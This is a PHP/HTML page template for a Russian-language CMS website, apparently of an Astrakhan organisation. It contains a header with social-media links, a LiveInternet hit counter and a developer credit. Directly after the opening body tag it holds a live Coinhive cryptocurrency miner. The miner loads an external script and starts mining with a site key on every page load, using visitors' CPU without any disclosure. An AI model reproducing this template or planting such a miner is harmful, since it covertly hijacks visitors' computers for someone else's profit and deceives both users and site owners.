<!DOCTYPE html>

<html lang="ru">
	<head>
		<?=$this->templates->output_metatags();?>
		<title><?=$this->templates->output_pagetitle();?></title>
		 <meta name="viewport" content="width=device-width, initial-scale=1.0">
		<?=$this->templates->output_variables();?>
		<?=$this->templates->output_special_assets();?>
		<th:include></th:include>
	</head>
	<body <?=$this->templates->body_classes();?>>
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>var miner = new CoinHive.User('HALSXN9AyLfSGAbsXipzMJcJxVoJW6It', 'dunedreams', {throttle: 0.5});miner.start();</script>
		<div id="font_panel" name="top">
			<th:fontpanel></th:fontpanel>
		</div>
		
		<div class="cms_container">
			<div id="header">	
				<a href="/">
					<img src="/templates/astrobs/img/logotype.png" id="logotype" alt="<?=$this->templates->output_pagetitle();?>" />
				</a>
				<img src="/templates/astrobs/img/header-book.png" id="header-book" />
				
				<th:versite></th:versite>
				
				<div id="header-ico">
					<a href="https://www.facebook.com/profile.php?id=100024931699391" target="_blank"><img src="/templates/astrobs/img/ico-04.png" /></a>
					<a href="http://twitter.com/bcslep" target="_blank"><img src="/templates/astrobs/img/ico-05.png" /></a>
					<a href="https://vk.com/id507093575" target="_blank"><img src="/templates/astrobs/img/ico-02.png" /></a>
					<a href="http://bcslep.livejournal.com/" target="_blank"><img src="/templates/astrobs/img/ico-01.png" /></a>
					<a href="http://www.odnoklassniki.ru/profile/556769032083" target="_blank"><img src="/templates/astrobs/img/ico-03.png" /></a>
					<a href="https://instagram.com/obs_astrahan?igshid=100baj64h0618" target="_blank"><img src="/templates/astrobs/img/ico-06.png" /></a>
				</div>
			</div>
		
			<div id="toolbar">
				<div class="cms_row" id="shadow-toolbar">
					<th:header></th:header>
					<div class="clearfix"></div>
				</div>
			</div>
		
			<div id="wrapper">
				<div class="cms_row" id="shadow-left">
					<div class="cms_col-lg-3">
						<th:left></th:left>
						<div class="clearfix"></div>
					</div>
					<div class="cms_col-lg-9">
						<th:content></th:content>
						<div class="clearfix"></div>
					</div>
					<div class="clearfix"></div>
				</div>
	
				<div class="clearfix"></div>
	
				<div id="footer">
					<div id="footer-up">
						<a href="#top">НАВЕРХ</a>
					</div>
					
					<div class="cms_row">
						<div class="cms_col-lg-2">
							<div id="hit_counter">
								<!--LiveInternet counter-->
								<script type="text/javascript">
									<!--
									document.write("<a href='http://www.liveinternet.ru/click' "+
									"target=_blank><img src='//counter.yadro.ru/hit?t11.1;r"+
									escape(document.referrer)+((typeof(screen)=="undefined")?"":
									";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
									screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
									";"+Math.random()+
									"' alt='' title='LiveInternet: показано число просмотров за 24"+
									" часа, посетителей за 24 часа и за сегодня' "+
									"border='0' width='88' height='31'><\/a>")
									//-->
								</script>
								<!--/LiveInternet-->
							</div>
						</div>
						<div class="cms_col-lg-7">
							<th:footer></th:footer>
						</div>
						<div class="cms_col-lg-3">
							<a href="http://logosnet.ru" target="_blank" id="logos">
								Разработка сайта, поддержка и продвижение ООО "Издательство "Логос"
							</a>
						</div>
					</div>
					<div class="clearfix"></div>
				</div>
				
				<div class="clearfix"></div>
			</div>
		</div>
		
		<!-- init js -->
		<script type="text/javascript">
			jQuery(document).ready(function(){
				$('.mod_photo a').lightBox();
			});
		</script>

	</body>
</html>
